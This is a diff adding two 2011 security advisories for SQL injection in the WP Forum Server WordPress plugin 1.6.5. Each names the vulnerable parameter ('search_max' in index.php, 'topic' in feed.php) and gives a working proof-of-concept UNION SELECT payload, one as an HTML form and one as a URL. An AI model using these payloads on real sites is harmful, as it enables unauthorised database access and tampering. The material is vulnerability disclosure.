@@ -1,0 +1,45 @@
+Vulnerability ID: HTB22851
+Reference: http://www.htbridge.ch/advisory/sql_injection_in_wp_forum_server_wordpre
+ss_plugin_1.html
+Product: WP Forum Server wordpress plugin
+Vendor: VastHTML
+Vulnerable Version: 1.6.5
+Vendor Notification: 10 February 2011
+Vulnerability Type: SQL Injection
+Risk level: High
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/)
+
+Vulnerability Details:
+The vulnerability exists due to failure in the "index.php" script to properly sanitize user-supplied input in "search_max" variable.
+Attacker can alter queries to the application SQL database, execute arbitrary queries to the database, compromise the application, access or modify sensitive data, or exploit various vulnerabilities in the underlying SQL database.
+
+The following PoC is available:
+
+<form action="http://[host]/?page_id=[page_id]&vasthtmlaction=search" method="post" name="main" >
+<input type="hidden" name="search_words" value="123" />
+<input type="hidden" name="search_submit" value="Search forums" />
+<input type="hidden" name="search_user" value="*" />
+<input type="hidden" name="search_min" value="0" />
+<input type="hidden" name="search_max" value="9999 DAY) union select version(),2,3,4 -- " />
+<input type="submit" value="search" name="submit" />
+</form>
+
+Vulnerability ID: HTB22850
+Reference: http://www.htbridge.ch/advisory/sql_injection_in_wp_forum_server_wordpre
+ss_plugin.html
+Product: WP Forum Server wordpress plugin
+Vendor: VastHTML ( http://lucidcrew.com/ )
+Vulnerable Version: 1.6.5
+Vendor Notification: 10 February 2011
+Vulnerability Type: SQL Injection
+Risk level: High
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/)
+
+Vulnerability Details:
+The vulnerability exists due to failure in the "/wp-content/plugins/forum-server/feed.php" script to properly sanitize user-supplied input in "topic" variable.
+Attacker can alter queries to the application SQL database, execute arbitrary queries to the database, compromise the application, access or modify sensitive data, or exploit various vulnerabilities in the underlying SQL database.
+
+The following PoC is available:
+
+http://[host]/wp-content/plugins/forum-server/feed.php?topic=1%20union%2
+0select%20version%28%29%20--
